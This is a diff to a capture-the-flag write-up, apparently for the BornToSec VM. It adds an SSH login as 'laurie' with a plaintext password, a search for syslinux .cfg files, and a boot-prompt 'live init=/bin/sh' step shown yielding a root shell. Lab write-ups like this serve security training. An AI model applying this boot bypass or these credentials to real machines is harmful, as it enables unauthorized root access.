@@ -5,7 +5,22 @@ When we saw that the vm was booting in linux system, we search a way to modify t
 After some research, we found a way to find boot users with a cfg file 
 [syslinux](https://wiki.syslinux.org/wiki/index.php?title=Config)
 
+We need to have a ssh user to search this cfg ile, so we can use the first user find in writeup1, `laurie` and the password `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` :
+
 ```bash
+> ssh laurie@{IP}
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+> laurie@{IP} password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+> ls
+bomb  README
+
 > find / -type f -name *.cfg | grep -v denied > file
 > cat file
 
@@ -55,7 +70,13 @@ We can see that the default user is live, so we can use a tip found on stack ove
 We found the way to launch the boot manager from syslinux, hold shift or alt when the vm is starting then we use `init=/bin/sh` to force the kernel to launch with live and execute the command:
 
 ```bash
-boot: live init=/bin/sh
+> boot: live init=/bin/sh
+error: unexpectedly disconnected from boot status daemon
+Using CD-ROM mount point /cdrom/
+Identifying.. [f50981139b1caeeed8e022c046838eaf1-2]
+Scanning disc for index files..
+/bin/sh: 0: can't access tty; job control turned off
+> # whoami
+root
 ```
-
 
